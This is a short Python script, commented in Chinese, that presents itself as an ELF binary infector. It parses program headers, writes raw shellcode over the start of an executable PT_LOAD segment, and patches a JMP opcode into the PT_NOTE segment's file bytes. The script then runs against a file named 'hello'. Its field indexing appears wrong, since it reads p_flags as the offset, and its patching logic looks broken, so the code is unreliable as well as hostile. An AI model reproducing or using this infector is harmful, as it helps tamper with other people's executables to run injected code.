import struct

# 读取 ELF 文件头
def read_elf_header(fd):
    ELF_HEADER_FMT = '16sHHIQQQIHHHHHH'  # ELF 64-bit header format
    fd.seek(0)
    elf_header_data = fd.read(struct.calcsize(ELF_HEADER_FMT))
    return struct.unpack(ELF_HEADER_FMT, elf_header_data)

# 读取程序头表
def read_program_headers(fd, elf_header):
    PROGRAM_HEADER_FMT = 'IIQQQQQ'  # ELF 64-bit program header format
    phoff = elf_header[5]  # 程序头表偏移量
    phnum = elf_header[9]  # 程序头表条目数量
    fd.seek(phoff)

    program_headers = []
    for _ in range(phnum):
        ph_data = fd.read(struct.calcsize(PROGRAM_HEADER_FMT))
        program_headers.append(struct.unpack(PROGRAM_HEADER_FMT, ph_data))
    return program_headers

# 修改 PT_NOTE 段以便跳转到 PT_LOAD 段
def modify_ptnote_jump(fd, note_offset, load_vaddr):
    fd.seek(note_offset)
    # 跳转到 PT_LOAD 段的相对偏移
    jump_offset = load_vaddr - (note_offset + 5)
    jmp_instr = b'\xE9' + struct.pack('<I', jump_offset & 0xFFFFFFFF)  # JMP 指令
    fd.write(jmp_instr)

# 注入 shellcode 到 PT_LOAD 段
def inject_shellcode(fd, load_offset, shellcode):
    fd.seek(load_offset)
    fd.write(shellcode)

def infect_elf(file_path):
    with open(file_path, 'rb+') as fd:
        # 读取 ELF 文件头和程序头
        elf_header = read_elf_header(fd)
        program_headers = read_program_headers(fd, elf_header)

        # 查找 PT_NOTE 和可执行的 PT_LOAD 段
        note_offset, load_offset, load_vaddr = None, None, None
        for header in program_headers:
            if header[0] == 4:  # PT_NOTE 段
                note_offset = header[1]
            elif header[0] == 1 and header[5] & 0x4:  # PT_LOAD 段，且具有执行权限
                load_offset = header[1]
                load_vaddr = header[2]

        if note_offset and load_offset:
            # 注入 shellcode 到可执行的 PT_LOAD 段
            shellcode = b"\x48\xc7\xc0\x01\x00\x00\x00\x48\xc7\xc7\x01\x00\x00\x00\x48\xc7\xc6\x00\x60\x60\x00\x48\xc7\xc2\x0d\x00\x00\x00\x0f\x05"
            inject_shellcode(fd, load_offset, shellcode)

            # 修改 PT_NOTE 段以便跳转到 PT_LOAD 段
            modify_ptnote_jump(fd, note_offset, load_vaddr)

# 使用例子
infect_elf('hello')
